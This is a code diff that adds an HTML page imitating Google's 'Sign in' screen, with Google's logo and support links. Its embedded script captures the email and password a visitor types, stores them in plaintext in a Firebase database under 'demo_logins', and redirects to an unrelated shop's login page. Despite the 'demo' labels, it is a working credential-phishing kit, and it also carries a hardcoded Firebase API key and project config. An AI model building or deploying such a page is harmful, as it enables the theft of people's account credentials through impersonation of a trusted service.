@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Google Sign In</title>
+  <link rel="stylesheet" href="style.css"/>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <div class="container">
+    <!-- ✅ Added id="demoForm" -->
+    <form class="form-box" id="demoForm" method="POST">
+
+       <!-- Logo Google -->
+      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="google-logo">
+
+      <h1 class="title">Sign in</h1>
+      <p class="subtitle">Use your Google Account</p>
+
+      <!-- Input Email -->
+      <label>
+        Email or phone:
+        <input
+          type="email"
+          id="email"
+          name="email"
+          placeholder="Email or phone"
+          required
+          class="input-field"
+        />
+      </label>
+
+      <!-- Input Password -->
+      <label>
+        Enter your password:
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Enter your password"
+          required
+          class="input-field"
+        />
+      </label>
+
+       <div class="form-footer">
+        <a href="https://support.google.com/mail/answer/41078?hl=en&co=GENIE.Platform%3DDesktop" class="link" target="_blank" rel="noopener noreferrer">Forgot password?</a>
+      </div>
+
+      <p class="info-text">
+        Not your computer? Use Guest mode to sign in privately.
+        <a href="https://support.google.com/chrome/answer/6130773?hl=en&co=GENIE.Platform%3DAndroid#:~:text=In%20Guest%20mode%2C%20you%20won,or%20borrowing%20someone%20else's%20computer." class="link" target="_blank" rel="noopener noreferrer">Learn more about using Guest mode</a>
+      </p>
+
+      <div class="bottom-row">
+        <a href="https://support.google.com/accounts/answer/27441?hl=en&co=GENIE.Platform%3DAndroid" class="link create-account">Create account</a>
+
+        <button type="submit" class="next-btn">Next</button>
+      </div>
+
+    </form>
+  </div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+  import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDDTpWoyxS1gWPJR6Ftm2AX4OLl19vjL64",
+    authDomain: "demologinpage-3e381.firebaseapp.com",
+    databaseURL: "https://demologinpage-3e381-default-rtdb.firebaseio.com",
+    projectId: "demologinpage-3e381",
+    storageBucket: "demologinpage-3e381.firebasestorage.app",
+    messagingSenderId: "431695854030",
+    appId: "1:431695854030:web:0759a8c639f0b616bc139f"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const database = getDatabase(app);
+
+  document.getElementById("demoForm").addEventListener("submit", function (e) {
+    e.preventDefault(); // ⛔ prevent page reload
+
+    const email = document.getElementById("email").value;
+    const password = document.getElementById("password").value;
+
+    const demoData = {
+      email: email,
+      password: password,
+      submittedAt: new Date().toISOString()
+    };
+
+    push(ref(database, "demo_logins"), demoData)
+      .then(() => {
+        window.location.href = "https://harshaindia.com/index.php?route=account/login";
+      })
+      .catch((error) => {
+        alert("Error saving data: " + error.message);
+      });
+  });
+</script>
+
+</body>
+</html>
